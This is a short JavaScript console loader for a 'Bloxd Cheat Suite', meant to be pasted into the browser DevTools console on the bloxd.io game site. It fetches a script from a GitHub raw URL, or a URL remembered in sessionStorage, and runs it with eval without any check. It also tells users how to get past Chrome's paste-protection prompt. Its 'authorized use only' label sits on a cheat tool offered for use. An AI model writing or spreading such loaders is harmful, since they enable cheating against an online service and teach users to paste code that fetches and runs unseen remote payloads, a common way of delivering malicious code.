/* Bloxd Cheat Suite v0.4.1 - console loader (paste into DevTools Console on bloxd.io)
   AUTHORIZED USE ONLY: operator-approved vulnerability test PoC.
   Note: Chrome may require typing "allow pasting" once before pasting works.
   The first URL you enter is remembered for this tab (sessionStorage: bcs_v1_src). */
(() => {
  'use strict';
  // EDIT ME: default raw URL of your repo's output/script.js
  const BCS_URL = "https://raw.githubusercontent.com/ZeqraydMC/TestRepository/main/script.js";
  let cached = null;
  try { cached = sessionStorage.getItem('bcs_v1_src'); } catch (e) {}
  const url = cached || BCS_URL;
  fetch(url)
    .then(r => r.ok ? r.text() : Promise.reject(new Error('HTTP ' + r.status)))
    .then(eval)
    .then(() => console.log('[BCS] loaded from ' + url))
    .catch(e => alert('[BCS] ' + e.message));
})();
